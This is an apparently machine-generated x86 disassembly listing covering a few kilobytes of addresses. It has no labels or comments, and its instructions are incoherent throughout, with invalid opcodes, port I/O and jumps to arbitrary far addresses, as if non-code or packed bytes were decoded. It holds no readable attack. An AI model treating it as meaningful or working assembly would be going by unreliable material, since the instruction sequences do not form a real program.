  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0xf7717fa8
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx-0x17]
  40bac3:	or     edx,edx
  40bac5:	call   0x88367db
  40baca:	add    DWORD PTR [ecx],edx
  40bacc:	or     esp,DWORD PTR [esp+ebp*8-0x1f23a297]
  40bad3:	sub    ebx,ebp
  40bad5:	pusha  
  40bad6:	fwait
  40bad7:	enter  0x42f5,0x99
  40badb:	jnp    0x40bb38
  40badd:	sub    BYTE PTR [eax+0x24],ah
  40bae0:	push   es
  40bae1:	jl     0x40ba9b
  40bae3:	xor    dh,BYTE PTR [eax+0x20]
  40bae6:	inc    esp
  40bae7:	jp     0x40bade
  40bae9:	in     eax,0x58
  40baeb:	popa   
  40baec:	daa    
  40baed:	adc    al,cl
  40baef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baf0:	test   al,dh
  40baf2:	lahf   
  40baf3:	adc    DWORD PTR [esi+ebp*8+0x63b45390],edx
  40bafa:	push   0xebd2e92a
  40baff:	jb     0x40bb0a
  40bb01:	mov    dh,0x82
  40bb03:	cli    
  40bb04:	push   esp
  40bb05:	cmp    eax,0x2a524e98
  40bb0a:	call   0xd827:0x40b43cee
  40bb11:	cmp    DWORD PTR [ebx-0x5777b91f],esi
  40bb17:	inc    edi
  40bb18:	xor    eax,0x3c92c19a
  40bb1d:	mov    DWORD PTR [ebp+0x5],ebp
  40bb20:	sub    BYTE PTR [eax],dl
  40bb22:	lgs    esi,FWORD PTR [edx+esi*1]
  40bb26:	ins    DWORD PTR es:[edi],dx
  40bb27:	mov    ds:0xc309a63d,eax
  40bb2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb2d:	cmp    bh,BYTE PTR [ebx-0x519d8644]
  40bb33:	clc    
  40bb34:	adc    ah,cl
  40bb36:	pusha  
  40bb37:	lea    ebx,[ebx]
  40bb39:	out    dx,eax
  40bb3a:	jb     0x40bad3
  40bb3c:	mov    ebp,0x6598740d
  40bb41:	xor    bl,BYTE PTR [edi-0x460b7352]
  40bb47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb48:	gs adc ebx,esi
  40bb4b:	test   DWORD PTR [edi],edx
  40bb4d:	out    dx,al
  40bb4e:	out    0x7c,al
  40bb50:	mov    esi,0x6574534c
  40bb55:	or     edi,ebp
  40bb57:	ret    0x3b12
  40bb5a:	pop    ebx
  40bb5b:	xchg   ecx,eax
  40bb5c:	dec    edi
  40bb5d:	ins    BYTE PTR es:[edi],dx
  40bb5e:	jg     0x40baeb
  40bb60:	push   0xbb0401da
  40bb65:	push   ss
  40bb66:	and    eax,0xbe5dab3f
  40bb6b:	jno    0x40baef
  40bb6d:	xchg   esi,eax
  40bb6e:	pop    esi
  40bb6f:	arpl   WORD PTR [edx-0x60],bp
  40bb72:	push   ecx
  40bb73:	scas   al,BYTE PTR es:[edi]
  40bb74:	pop    es
  40bb75:	mov    esp,cs
  40bb77:	mov    edi,eax
  40bb79:	cwde   
  40bb7a:	dec    ebx
  40bb7b:	jmp    0x40bbdd
  40bb7d:	(bad)  
  40bb7f:	data16 data16 das 
  40bb82:	xchg   edx,eax
  40bb83:	cdq    
  40bb84:	and    cl,cl
  40bb86:	mov    dl,0x6e
  40bb88:	mov    ds:0x31e52991,al
  40bb8d:	outs   dx,DWORD PTR ds:[esi]
  40bb8e:	std    
  40bb8f:	dec    ebp
  40bb90:	pop    ds
  40bb91:	imul   ecx,ebp,0xffffffe9
  40bb94:	cwde   
  40bb95:	(bad)  
  40bb96:	jae    0x40bb8c
  40bb98:	sti    
  40bb99:	dec    eax
  40bb9a:	addr16 jnp 0x40bba2
  40bb9d:	push   ebp
  40bb9e:	cdq    
  40bb9f:	ss pop eax
  40bba1:	shl    BYTE PTR [esi-0x4d],cl
  40bba4:	xchg   BYTE PTR [esi],bh
  40bba6:	dec    ebx
  40bba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bba8:	sbb    al,0x82
  40bbaa:	cmp    DWORD PTR [ebp+0x8],ebx
  40bbad:	pop    edi
  40bbae:	xchg   ecx,eax
  40bbaf:	inc    ecx
  40bbb0:	push   edx
  40bbb1:	fcmovb st,st(3)
  40bbb3:	jbe    0x40bb6f
  40bbb5:	fidivr DWORD PTR [edx]
  40bbb7:	xchg   ecx,eax
  40bbb8:	pop    ebx
  40bbb9:	aaa    
  40bbba:	call   0xe1d3a1a3
  40bbbf:	cmp    cl,BYTE PTR [esi+ecx*4]
  40bbc2:	in     al,0x47
  40bbc4:	mov    ecx,DWORD PTR [ebx+0x59]
  40bbc7:	aaa    
  40bbc8:	xchg   DWORD PTR [ebx],eax
  40bbca:	ss jae 0x40bc28
  40bbcd:	xor    edx,edi
  40bbcf:	or     DWORD PTR cs:[ecx],eax
  40bbd2:	mov    ch,bh
  40bbd4:	dec    edi
  40bbd5:	push   0x8cae5276
  40bbda:	outs   dx,BYTE PTR ds:[esi]
  40bbdb:	in     ax,dx
  40bbdd:	shl    DWORD PTR [esi-0x32],0xc6
  40bbe1:	shl    BYTE PTR [ecx-0x40e9f66d],1
  40bbe7:	add    BYTE PTR [eax+0x6f],bl
  40bbea:	jnp    0x40bb95
  40bbec:	inc    ebp
  40bbed:	ret    0x562d
  40bbf0:	repz sbb ch,BYTE PTR [ebx+0x16]
  40bbf4:	jge    0x40bbe4
  40bbf6:	aaa    
  40bbf7:	sbb    ebx,DWORD PTR [edx-0x39]
  40bbfa:	mov    ebx,0xdf32dfb0
  40bbff:	adc    ebx,ebx
  40bc01:	xchg   edi,eax
  40bc02:	fstp   DWORD PTR [eax]
  40bc04:	push   esi
  40bc05:	add    al,0x3
  40bc07:	cmp    edx,DWORD PTR [eax+0x36]
  40bc0a:	xor    DWORD PTR [ebx],edi
  40bc0c:	mov    eax,ds:0xe84f6015
  40bc11:	mov    ch,0xf6
  40bc13:	call   0xc8b4:0x7c4e6263
  40bc1a:	push   ds
  40bc1b:	pop    ebx
  40bc1c:	fnstsw WORD PTR [ebx-0x211ae738]
  40bc22:	sub    bh,al
  40bc24:	or     BYTE PTR [esi],0x6b
  40bc27:	mov    ds:0x1abc9d5d,al
  40bc2c:	pop    ss
  40bc2d:	push   0xffffffc1
  40bc2f:	push   ebp
  40bc30:	imul   ebp,DWORD PTR [ebx],0x5066ec52
  40bc36:	pop    ebx
  40bc37:	ja     0x40bbf8
  40bc39:	pop    ss
  40bc3a:	mov    ebp,0xad87c6a0
  40bc3f:	adc    eax,0x586a3fee
  40bc44:	mov    dl,0x1c
  40bc46:	xchg   ecx,eax
  40bc47:	and    esp,DWORD PTR ds:0xea941dff
  40bc4d:	adc    DWORD PTR [ecx+0x306d63cd],0x5df1ef64
  40bc57:	xchg   DWORD PTR [ebp-0x51],ebp
  40bc5a:	fwait
  40bc5b:	cmp    BYTE PTR [edi+0x51],0x66
  40bc5f:	stc    
  40bc60:	loopne 0x40bc11
  40bc62:	mov    BYTE PTR [ebp-0x64],al
  40bc65:	inc    ebp
  40bc66:	ret    0x6fc6
  40bc69:	std    
  40bc6a:	cmp    dh,BYTE PTR [edx]
  40bc6c:	lea    ecx,[ecx-0x4c707708]
  40bc72:	jmp    0x71d3e2ce
  40bc77:	pop    ds
  40bc78:	or     eax,0xc5b71d25
  40bc7d:	sti    
  40bc7e:	xchg   ecx,eax
  40bc7f:	in     eax,0x6f
  40bc81:	and    eax,edx
  40bc83:	mov    ecx,0xebb8a114
  40bc88:	shl    ecx,cl
  40bc8a:	out    dx,eax
  40bc8b:	xchg   ebp,eax
  40bc8c:	lock sti 
  40bc8e:	add    DWORD PTR [esi-0x3bba001b],eax
  40bc94:	into   
  40bc95:	jle    0x40bcb0
  40bc97:	xchg   edx,eax
  40bc98:	ins    BYTE PTR es:[edi],dx
  40bc99:	call   0x8898:0x4400fc31
  40bca0:	sbb    dl,BYTE PTR [edx+0x16]
  40bca3:	adc    DWORD PTR [edi+0x72],eax
  40bca6:	and    DWORD PTR [ebx-0x3b],esi
  40bca9:	inc    esi
  40bcaa:	test   al,0x6e
  40bcac:	pop    ecx
  40bcad:	pop    esi
  40bcae:	(bad)  
  40bcb0:	out    0xa1,eax
  40bcb2:	or     DWORD PTR ds:0x3fb0454c,ebx
  40bcb8:	les    ebx,FWORD PTR [ecx]
  40bcba:	inc    esi
  40bcbb:	sbb    BYTE PTR [esi-0x7bdd5a34],cl
  40bcc1:	or     cl,dl
  40bcc3:	push   ds
  40bcc4:	push   0xffffffe8
  40bcc6:	data16 mov WORD PTR [esi-0x53c90a77],fs
  40bccd:	sbb    BYTE PTR [eax+0x21],cl
  40bcd0:	dec    ebx
  40bcd1:	shr    DWORD PTR [eax+0x7e83a3ef],0x54
  40bcd8:	mov    al,ds:0x3f5fdf94
  40bcdd:	sub    eax,0x36e0076b
  40bce2:	out    dx,al
  40bce3:	add    BYTE PTR [eax-0xa2c689b],0xdf
  40bcea:	popa   
  40bceb:	sti    
  40bcec:	push   0x5a
  40bcee:	xchg   ecx,eax
  40bcef:	mov    bh,0xcc
  40bcf1:	adc    bh,dh
  40bcf3:	ret    0x6eff
  40bcf6:	in     eax,0xc
  40bcf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcf9:	sti    
  40bcfa:	aad    0x55
  40bcfc:	call   0x11506c4d
  40bd01:	in     al,dx
  40bd02:	sub    al,0xc
  40bd04:	jae    0x40bcbe
  40bd06:	or     DWORD PTR [edx],edx
  40bd08:	cmp    DWORD PTR [edx],edi
  40bd0a:	mov    al,0x4f
  40bd0c:	inc    ecx
  40bd0d:	in     al,dx
  40bd0e:	sub    DWORD PTR [edx+0x20],esi
  40bd11:	(bad)  
  40bd12:	aam    0xd
  40bd14:	repnz (bad) 
  40bd16:	aam    0x6b
  40bd18:	iret   
  40bd19:	cmp    ch,bh
  40bd1b:	adc    BYTE PTR [eax-0x22e41699],al
  40bd21:	bound  edi,QWORD PTR [ebx+0x2c1f3289]
  40bd27:	(bad)  
  40bd28:	jno    0x40bcb6
  40bd2a:	mov    edx,0xec4b9b34
  40bd2f:	adc    eax,DWORD PTR [ebx+ecx*8+0x4173ffd4]
  40bd36:	inc    esi
  40bd37:	imul   edx,DWORD PTR [ebx],0x3cd10acb
  40bd3d:	mov    eax,ds:0xcace7e74
  40bd42:	bound  ebx,QWORD PTR [ecx-0x2ed049a9]
  40bd48:	lea    ebp,[edx+0x20b9ca9c]
  40bd4e:	outs   dx,BYTE PTR ds:[esi]
  40bd4f:	scas   al,BYTE PTR es:[edi]
  40bd50:	repnz mov bh,0x48
  40bd53:	in     al,dx
  40bd54:	and    DWORD PTR [eax+0x56784435],ebp
  40bd5a:	adc    BYTE PTR [eax+0x67],dh
  40bd5d:	mov    bl,0xc8
  40bd5f:	jmp    DWORD PTR [edx]
  40bd61:	and    eax,0x41e5ed4f
  40bd66:	fcom   DWORD PTR [edi-0x2]
  40bd69:	sbb    eax,0xc92107a2
  40bd6e:	out    dx,eax
  40bd6f:	cli    
  40bd70:	add    eax,0x309388
  40bd75:	mov    dh,0xd8
  40bd77:	sbb    bl,BYTE PTR [edx-0x60]
  40bd7a:	jp     0x40bd4e
  40bd7c:	jle    0x40bdf1
  40bd7e:	and    BYTE PTR [edi],dl
  40bd80:	jnp    0x40bd90
  40bd82:	scas   eax,DWORD PTR es:[edi]
  40bd83:	jg     0x40bdb6
  40bd85:	pop    esp
  40bd86:	pop    ss
  40bd87:	jne    0x40bdf9
  40bd89:	jp     0x40bd96
  40bd8b:	icebp  
  40bd8c:	fild   DWORD PTR [eax]
  40bd8e:	xor    DWORD PTR [esi-0x27],0xef1f3dc1
  40bd95:	std    
  40bd96:	retf   0xac5e
  40bd99:	lock mov ah,0x3
  40bd9c:	js     0x40be07
  40bd9e:	(bad)  
  40bd9f:	icebp  
  40bda0:	jle    0x40bd32
  40bda2:	adc    DWORD PTR [ebp-0x2e49d2ae],edx
  40bda8:	jmp    0x40bdc0
  40bdaa:	xchg   ebp,esi
  40bdac:	adc    al,0xa1
  40bdae:	leave  
  40bdaf:	inc    esi
  40bdb0:	xor    BYTE PTR [esi-0x2c708625],al
  40bdb6:	and    al,0x27
  40bdb8:	mov    dl,0x45
  40bdba:	adc    eax,0x9689beec
  40bdbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdc0:	sbb    dh,cl
  40bdc2:	dec    edx
  40bdc3:	inc    eax
  40bdc4:	cli    
  40bdc5:	cmp    esp,DWORD PTR [edi+0x77]
  40bdc8:	sub    DWORD PTR [esi-0x5d],edi
  40bdcb:	xchg   ecx,eax
  40bdcc:	out    0x9,eax
  40bdce:	lods   al,BYTE PTR ds:[esi]
  40bdcf:	outs   dx,BYTE PTR ds:[esi]
  40bdd0:	jmp    0x40bd56
  40bdd2:	in     eax,0x18
  40bdd4:	pop    edx
  40bdd5:	mov    ds:0x7db7efdd,al
  40bdda:	rcr    DWORD PTR [ecx],0x41
  40bddd:	ds pop ss
  40bddf:	mov    dl,0x15
  40bde1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bde2:	add    DWORD PTR [esi],edi
  40bde4:	ret    
  40bde5:	sar    BYTE PTR [edx+ecx*8],cl
  40bde8:	pop    ecx
  40bde9:	bnd jns 0x40bdc9
  40bdec:	sbb    DWORD PTR [ecx],esi
  40bdee:	shr    DWORD PTR [eax],0x93
  40bdf1:	lea    ecx,[edi]
  40bdf3:	sbb    al,BYTE PTR [esi+0x7ac383a9]
  40bdf9:	cld    
  40bdfa:	jae    0x40bdff
  40bdfc:	je     0x40bdfd
  40bdfe:	mov    bl,0xd0
  40be00:	les    edi,FWORD PTR [ecx+0x7dd68e79]
  40be06:	shl    DWORD PTR [edx-0x4e],1
  40be09:	cdq    
  40be0a:	mov    ch,0xfb
  40be0c:	mov    eax,ds:0x69c73ccb
  40be11:	inc    esi
  40be12:	cs or  esi,edi
  40be15:	jmp    0xb787:0xfa18c508
  40be1c:	cmp    esp,edi
  40be1e:	cmp    al,0xcc
  40be20:	jl     0x40be80
  40be22:	dec    ecx
  40be23:	loope  0x40bdc9
  40be25:	sub    DWORD PTR [ecx+ebp*8-0x55],0x9
  40be2a:	sbb    dh,BYTE PTR ds:0xf3864d6f
  40be30:	mov    dh,0x75
  40be32:	je     0x40be85
  40be34:	ror    BYTE PTR [esi],cl
  40be36:	xchg   ebx,eax
  40be37:	push   eax
  40be38:	pusha  
  40be39:	xchg   esi,eax
  40be3a:	sbb    edi,esp
  40be3c:	cmp    eax,0xf0389479
  40be41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be42:	(bad)  
  40be43:	ins    BYTE PTR es:[edi],dx
  40be44:	pushf  
  40be45:	inc    esi
  40be46:	mov    cl,0x77
  40be48:	xchg   esp,eax
  40be49:	xchg   edi,eax
  40be4a:	jp     0x40be57
  40be4c:	jb     0x40bdff
  40be4e:	call   FWORD PTR es:0xa615d6e8
  40be55:	jnp    0x40bdfb
  40be57:	jg     0x40be3d
  40be59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be5a:	mov    WORD PTR [edi+0x66fef76b],es
  40be60:	xchg   ebx,eax
  40be61:	push   ds
  40be62:	cs ret 
  40be64:	push   eax
  40be65:	sub    ah,ah
  40be67:	jg     0x40be63
  40be69:	call   0x87ee:0x817713d6
  40be70:	leave  
  40be71:	or     ebp,DWORD PTR [eax-0x4d]
  40be74:	stos   BYTE PTR es:[edi],al
  40be75:	leave  
  40be76:	rcl    DWORD PTR [edx-0x6de67047],cl
  40be7c:	mov    DWORD PTR [ecx+0x29],ebp
  40be7f:	cmp    al,0x5b
  40be81:	jmp    0x752e9af
  40be86:	or     BYTE PTR [esi+eax*4+0x1c],al
  40be8a:	jae    0x40bea3
  40be8c:	std    
  40be8d:	shl    BYTE PTR [esi+0xd],1
  40be90:	aam    0xe8
  40be92:	aaa    
  40be93:	xor    BYTE PTR ds:0x8c9a5763,bh
  40be99:	test   eax,0xcf695b05
  40be9e:	imul   BYTE PTR gs:[eax]
  40bea1:	add    dh,dh
  40bea3:	push   ss
  40bea4:	stos   BYTE PTR es:[edi],al
  40bea5:	push   eax
  40bea6:	mov    BYTE PTR [esi-0x6ab2467],dl
  40beac:	xchg   edx,eax
  40bead:	in     al,dx
  40beae:	pop    eax
  40beaf:	mov    esi,0x8d7a351e
  40beb4:	fsubr  st(1),st
  40beb6:	ins    BYTE PTR es:[edi],dx
  40beb7:	add    eax,0x73de7fad
  40bebc:	aaa    
  40bebd:	push   eax
  40bebe:	xor    BYTE PTR [esi*4-0x1d61cbda],dh
  40bec5:	and    ch,BYTE PTR [edi]
  40bec7:	int    0xfd
  40bec9:	pop    ebx
  40beca:	inc    esp
  40becb:	rcr    BYTE PTR [eax],0x10
  40bece:	sbb    esp,DWORD PTR [edi]
  40bed0:	pushf  
  40bed1:	stos   BYTE PTR es:[edi],al
  40bed2:	dec    ebp
  40bed3:	mov    esi,0xe007df2e
  40bed8:	(bad)  
  40bed9:	pusha  
  40beda:	loop   0x40bef8
  40bedc:	xchg   esi,eax
  40bedd:	dec    eax
  40bede:	jno    0x40bee4
  40bee0:	mov    dl,dh
  40bee2:	xchg   DWORD PTR [ecx],ebx
  40bee4:	mov    ah,0xa8
  40bee6:	aaa    
  40bee7:	xchg   ecx,eax
  40bee8:	out    0x6a,al
  40beea:	jge    0x40bf41
  40beec:	sub    dl,BYTE PTR [eax+0x15]
  40beef:	inc    eax
  40bef0:	outs   dx,BYTE PTR ds:[esi]
  40bef1:	push   cs
  40bef2:	or     dl,ch
  40bef4:	sub    al,0x44
  40bef6:	in     eax,0x5d
  40bef8:	cwde   
  40bef9:	jns    0x40be8c
  40befb:	js     0x40bf4f
  40befd:	mov    ds:0xe7d8e9d1,eax
  40bf02:	jge    0x40bf63
  40bf04:	ror    DWORD PTR ds:[eax-0x2b],cl
  40bf08:	into   
  40bf09:	fstp   DWORD PTR ds:0x817ddadc
  40bf0f:	mov    BYTE PTR ds:0x858b5b31,ch
  40bf15:	mov    eax,ds:0x3b315e43
  40bf1a:	jg     0x40bf00
  40bf1c:	push   eax
  40bf1d:	scas   al,BYTE PTR es:[edi]
  40bf1e:	hlt    
  40bf1f:	fisub  DWORD PTR [ebp+edi*1-0x3e]
  40bf23:	loopne 0x40bf26
  40bf25:	add    BYTE PTR [esi+ebp*1+0x42],cl
  40bf29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf2a:	leave  
  40bf2b:	add    DWORD PTR [edi+0x5d],edi
  40bf2e:	mov    al,ds:0xc83cda83
  40bf33:	jne    0x40becf
  40bf35:	sbb    al,BYTE PTR [esi-0x3e80a93c]
  40bf3b:	xchg   esi,eax
  40bf3c:	xchg   edx,eax
  40bf3d:	int3   
  40bf3e:	mov    al,ds:0x2cdb3e15
  40bf43:	std    
  40bf44:	in     eax,dx
  40bf45:	test   al,0xcd
  40bf47:	dec    eax
  40bf48:	outs   dx,BYTE PTR ds:[esi]
  40bf49:	stos   BYTE PTR es:[edi],al
  40bf4a:	mov    bl,0xa6
  40bf4c:	pop    eax
  40bf4d:	jnp    0x40bf62
  40bf4f:	pop    eax
  40bf50:	(bad)  
  40bf51:	loope  0x40bfb7
  40bf53:	fsubr  st(2),st
  40bf55:	dec    ebp
  40bf56:	pop    ss
  40bf57:	aad    0xe4
  40bf59:	or     al,0xe1
  40bf5b:	or     dh,0xc2
  40bf5e:	lods   al,BYTE PTR ds:[esi]
  40bf5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf60:	in     eax,0x51
  40bf62:	dec    edx
  40bf63:	inc    ebp
  40bf64:	out    dx,al
  40bf65:	fs enter 0x7a84,0x67
  40bf6a:	sub    al,0xe7
  40bf6c:	call   0x999cfc56
  40bf71:	mov    dl,0x7a
  40bf73:	xor    al,BYTE PTR [ebx]
  40bf75:	test   eax,0xe92a45c9
  40bf7a:	icebp  
  40bf7b:	push   cs
  40bf7c:	cwde   
  40bf7d:	xor    DWORD PTR [edi],ecx
  40bf7f:	pop    edx
  40bf80:	push   esi
  40bf81:	into   
  40bf82:	shr    DWORD PTR ds:0x8887ef24,cl
  40bf88:	pop    esp
  40bf89:	or     DWORD PTR [ebx-0x432284c9],0xa14bcd9a
  40bf93:	pop    esp
  40bf94:	repnz or dl,ah
  40bf97:	inc    esp
  40bf98:	or     bh,0x33
  40bf9b:	xchg   esi,eax
  40bf9c:	sbb    DWORD PTR [edi-0x36],eax
  40bf9f:	data16 jcxz 0x40bfbe
  40bfa3:	out    0x9c,eax
  40bfa5:	(bad)  
  40bfa6:	imul   edx,DWORD PTR [ebx+0x6803eaa4],0xffffff95
  40bfad:	pop    DWORD PTR [ebx+0x14]
  40bfb0:	fimul  WORD PTR [ebx]
  40bfb2:	pop    es
  40bfb3:	out    dx,al
  40bfb4:	mov    edx,0xc63b7c65
  40bfb9:	clc    
  40bfba:	das    
  40bfbb:	cli    
  40bfbc:	es jle 0x40bf45
  40bfbf:	mul    DWORD PTR [ecx+0x1db8da]
  40bfc5:	mov    eax,0xde359cb
  40bfca:	xchg   esi,eax
  40bfcb:	xor    BYTE PTR [esi],ah
  40bfcd:	les    edx,FWORD PTR [edi]
  40bfcf:	dec    ebx
  40bfd0:	adc    al,0x4c
  40bfd2:	dec    ebp
  40bfd3:	(bad)  
  40bfd4:	out    0xa6,al
  40bfd6:	pop    esp
  40bfd7:	ins    BYTE PTR es:[edi],dx
  40bfd8:	sbb    edi,ebp
  40bfda:	jp     0x40bfe8
  40bfdc:	or     bl,BYTE PTR [ebp-0x7bb30981]
  40bfe2:	add    DWORD PTR [ebp+0xa],edx
  40bfe5:	fnstenv [ecx-0x7487285e]
  40bfeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfec:	jo     0x40bf81
  40bfee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfef:	push   cs
  40bff0:	mov    bl,0xe8
  40bff2:	adc    al,0x6f
  40bff4:	scas   al,BYTE PTR es:[edi]
  40bff5:	mov    esi,0x2699223f
  40bffa:	call   0x75d4744a
  40bfff:	sub    ebp,DWORD PTR [esi-0x5e]
  40c002:	push   0xffffff9b
  40c004:	lock stos DWORD PTR es:[edi],eax
  40c006:	lods   al,BYTE PTR ds:[esi]
  40c007:	into   
  40c008:	and    BYTE PTR [edi+ecx*2],dh
  40c00b:	adc    edx,DWORD PTR [ebx-0x6e9dbbe3]
  40c011:	jmp    0x69c1b52c
  40c016:	jecxz  0x40bfeb
  40c018:	jg     0x40c074
  40c01a:	int    0x75
  40c01c:	ret    
  40c01d:	fcomp  QWORD PTR [ebp-0x39]
  40c020:	xor    BYTE PTR [esp+eax*4],dh
  40c023:	stos   DWORD PTR es:[edi],eax
  40c024:	push   esi
  40c025:	and    BYTE PTR [edx-0x48],al
  40c028:	call   FWORD PTR [ebx-0x52]
  40c02b:	and    DWORD PTR [ebp-0x2eee6a4b],eax
  40c031:	cmp    BYTE PTR [edi+0x19],ch
  40c034:	std    
  40c035:	inc    ebx
  40c036:	stos   BYTE PTR es:[edi],al
  40c037:	and    BYTE PTR [edi-0x217e033b],bl
  40c03d:	lahf   
  40c03e:	shl    DWORD PTR [ecx],1
  40c040:	sbb    BYTE PTR [esi],0x35
  40c043:	xor    al,0x9e
  40c045:	test   eax,0x1570d549
  40c04a:	cli    
  40c04b:	xchg   esp,eax
  40c04c:	xchg   esi,eax
  40c04d:	cmp    ebx,DWORD PTR [esi]
  40c04f:	add    DWORD PTR [ebp-0x3eac69ea],ebx
  40c055:	pop    edi
  40c056:	mov    ecx,0x1960d136
  40c05b:	inc    ebx
  40c05c:	cmp    dl,bh
  40c05e:	jns    0x40c05f
  40c060:	jnp    0x40c00e
  40c062:	test   al,0x45
  40c064:	sbb    edi,DWORD PTR [esi+0xe0027a9]
  40c06a:	retf   0xf1da
  40c06d:	inc    ebp
  40c06e:	stc    
  40c06f:	nop
  40c070:	jns    0x40c0da
  40c072:	push   edx
  40c073:	adc    bl,al
  40c075:	call   FWORD PTR [edx]
  40c077:	cwde   
  40c078:	scas   al,BYTE PTR es:[edi]
  40c079:	dec    ebp
  40c07a:	xchg   edx,eax
  40c07b:	push   es
  40c07c:	nop
  40c07d:	daa    
  40c07e:	mov    edi,0x3971215f
  40c083:	sti    
  40c084:	arpl   WORD PTR [eax],sp
  40c086:	xor    DWORD PTR [ebx-0x4d932ad2],edi
  40c08c:	xor    DWORD PTR [edi+edx*2],0x8c1314ca
  40c093:	mov    edx,0xee1f6a62
  40c098:	jl     0x40c118
  40c09a:	sahf   
  40c09b:	jle    0x40c09b
  40c09d:	sbb    esp,DWORD PTR [esi+0x6e8e3ff3]
  40c0a3:	mov    al,0xe0
  40c0a5:	into   
  40c0a6:	xor    ebx,ebp
  40c0a8:	call   0xd9ef4448
  40c0ad:	mov    al,ds:0xd5dbc817
  40c0b2:	mov    WORD PTR [ebx+ebp*2],?
  40c0b5:	cmp    cl,BYTE PTR [esi-0x48ab818e]
  40c0bb:	mov    eax,ds:0xff5d9052
  40c0c0:	retf   0xba0e
  40c0c3:	test   al,0x5e
  40c0c5:	jmp    0x9997:0x44196de1
  40c0cc:	fwait
  40c0cd:	ins    DWORD PTR es:[edi],dx
  40c0ce:	fcmovu st,st(7)
  40c0d0:	or     eax,0x9264abd6
  40c0d5:	call   0xfcb9347e
  40c0da:	sbb    BYTE PTR [ebx-0x65],al
  40c0dd:	scas   al,BYTE PTR es:[edi]
  40c0de:	mul    DWORD PTR [esi+0x17d831c8]
  40c0e4:	ror    DWORD PTR [edi+0x6d],1
  40c0e7:	or     eax,0xaac837dc
  40c0ec:	adc    dl,BYTE PTR [edi]
  40c0ee:	cdq    
  40c0ef:	ins    DWORD PTR es:[edi],dx
  40c0f0:	jle    0x40c0d9
  40c0f2:	and    DWORD PTR [esi+0x3a],esi
  40c0f5:	mov    al,ds:0xf4f497a7
  40c0fa:	cmp    dl,BYTE PTR [ebp-0x5a4f9913]
  40c100:	pusha  
  40c101:	daa    
  40c102:	lahf   
  40c103:	es lahf 
  40c105:	and    esi,ebp
  40c107:	xchg   ebp,eax
  40c108:	inc    esi
  40c109:	shr    DWORD PTR [esi],0xab
  40c10c:	add    ah,bh
  40c10e:	test   al,0xa4
  40c110:	adc    cl,bh
  40c112:	and    cl,BYTE PTR [esp+ebx*2+0x57]
  40c116:	mov    edi,DWORD PTR es:[edx+0x7ec53237]
  40c11d:	jo     0x40c0c8
  40c11f:	jo     0x40c137
  40c121:	xor    eax,0x8410077b
  40c126:	cmp    eax,0x78a67289
  40c12b:	and    al,BYTE PTR [ebp+0x772f30ba]
  40c131:	and    eax,0x9df32c4f
  40c136:	mov    eax,0x5ef9c376
  40c13b:	ret    0xec2
  40c13e:	cdq    
  40c13f:	ds inc esp
  40c141:	int3   
  40c142:	rcl    esp,1
  40c144:	shl    ebp,1
  40c146:	fsub   DWORD PTR [esi-0x6d06d874]
  40c14c:	call   0x1605:0x7a6af49b
  40c153:	sub    ah,cl
  40c155:	adc    edi,eax
  40c157:	push   cs
  40c158:	int    0xda
  40c15a:	sbb    DWORD PTR [edx-0x13],esi
  40c15d:	inc    ebx
  40c15e:	sub    ebx,DWORD PTR [ebp-0x25]
  40c161:	and    al,0xc6
  40c163:	cli    
  40c164:	xchg   ebp,eax
  40c165:	clc    
  40c166:	push   ecx
  40c167:	cmp    eax,0xd45be79b
  40c16c:	cli    
  40c16d:	jae    0x40c16f
  40c16f:	and    eax,0xbf8304d5
  40c174:	pop    ebp
  40c175:	mov    DWORD PTR [ecx],0xb2379804
  40c17b:	fstp   st(1)
  40c17d:	ret    0x5304
  40c180:	xchg   esi,eax
  40c181:	in     al,dx
  40c182:	jge    0x40c150
  40c184:	push   DWORD PTR [ecx-0x1a]
  40c187:	xor    eax,0x4af2bbae
  40c18c:	xor    edx,DWORD PTR [esi+0x3]
  40c18f:	mov    esi,0x3ac27a85
  40c194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c195:	mov    BYTE PTR [edi-0x39ed6d26],dl
  40c19b:	test   cl,bl
  40c19d:	dec    ebx
  40c19e:	push   0x2f
  40c1a0:	push   0x80fc60ed
  40c1a5:	xchg   dl,al
  40c1a7:	out    dx,eax
  40c1a8:	and    eax,0x6302b160
  40c1ad:	outs   dx,DWORD PTR ds:[esi]
  40c1ae:	ins    DWORD PTR es:[edi],dx
  40c1af:	enter  0x6ced,0x2d
  40c1b3:	in     al,dx
  40c1b4:	sub    al,0x88
  40c1b6:	dec    ebp
  40c1b7:	mov    ebp,0xea1bc659
  40c1bc:	out    0xa0,eax
  40c1be:	adc    al,0x6
  40c1c0:	push   0x7e
  40c1c2:	out    0x1,eax
  40c1c4:	mov    edi,0x962a8ee7
  40c1c9:	add    DWORD PTR [eax],esi
  40c1cb:	fcmovnb st,st(2)
  40c1cd:	push   edi
  40c1ce:	call   0x1911:0xd492327f
  40c1d5:	ficomp WORD PTR [edi]
  40c1d7:	outs   dx,BYTE PTR ds:[esi]
  40c1d8:	cmp    al,0x2e
  40c1da:	xor    al,BYTE PTR [ebx+0x3d41a0f4]
  40c1e0:	dec    ebx
  40c1e1:	and    BYTE PTR [edi-0x4d86310b],cl
  40c1e7:	xchg   edx,eax
  40c1e8:	cmp    al,0xcc
  40c1ea:	jns    0x40c250
  40c1ec:	mov    ds:0xd323511f,al
  40c1f1:	leave  
  40c1f2:	pop    ecx
